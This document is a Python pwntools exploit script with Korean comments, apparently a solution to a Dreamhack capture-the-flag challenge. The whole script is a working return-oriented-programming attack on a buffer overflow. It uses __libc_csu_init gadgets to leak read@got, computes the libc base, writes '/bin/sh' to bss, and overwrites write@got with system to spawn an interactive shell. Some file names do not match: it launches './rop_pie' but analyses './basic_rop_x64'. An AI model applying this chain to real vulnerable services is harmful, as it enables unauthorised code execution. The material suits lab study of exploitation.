from pwn import *

def slog(name, addr):
        return success(": ".join([name, hex(addr)]))


p = process("./rop_pie")
#p = remote("host1.dreamhack.games", 9873)
e = ELF("./basic_rop_x64")
#libc = ELF("./libc.so.6")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

#context.log_level = 'debug'


# [1] 정보 수집
read_got = e.got["read"]
write_got = e.got["write"]

read_offset = libc.symbols["read"]
system_offset = libc.symbols["system"]

csu_init1 = 0x40087a
csu_init2 = 0x400860
bss = e.bss()
dummy = b'A'*8

payload = b'A'*72


# [2] write(1, read@got, 8) => read 함수의 실제 주소 출력
payload += p64(csu_init1)
payload += p64(0)
payload += p64(1)
payload += p64(write_got)
payload += p64(8)
payload += p64(read_got)
payload += p64(1)
payload += p64(csu_init2)


# [3] read(0, bss, 8) => bss 영역에 "/bin/sh" 쓰기
payload += dummy
payload += p64(0)
payload += p64(1)
payload += p64(read_got)
payload += p64(8)
payload += p64(bss)
payload += p64(0)
payload += p64(csu_init2)


# [4] read(0, write@got, 8) => write@got를 system으로 overwrite
payload += dummy
payload += p64(0)
payload += p64(1)
payload += p64(read_got)
payload += p64(8)
payload += p64(write_got)
payload += p64(0)
payload += p64(csu_init2)


# [5] write("/bin/sh") => system("/bin/sh")가 호출 됨
payload += dummy
payload += p64(0)
payload += p64(1)
payload += p64(write_got)
payload += p64(0)
payload += p64(0)
payload += p64(bss)
payload += p64(csu_init2)


# [6] payload, data 전송
p.send(payload)

p.recvuntil(b'A'*64)
read = u64(p.recvn(6)+b'\x00'*2)
lb = read - read_offset
system = lb + system_offset

slog("bss", bss)
slog("libc base", lb)
slog("read", read)
slog("system", system)

p.send(b"/bin/sh\x00")
p.send(p64(system))
p.interactive()

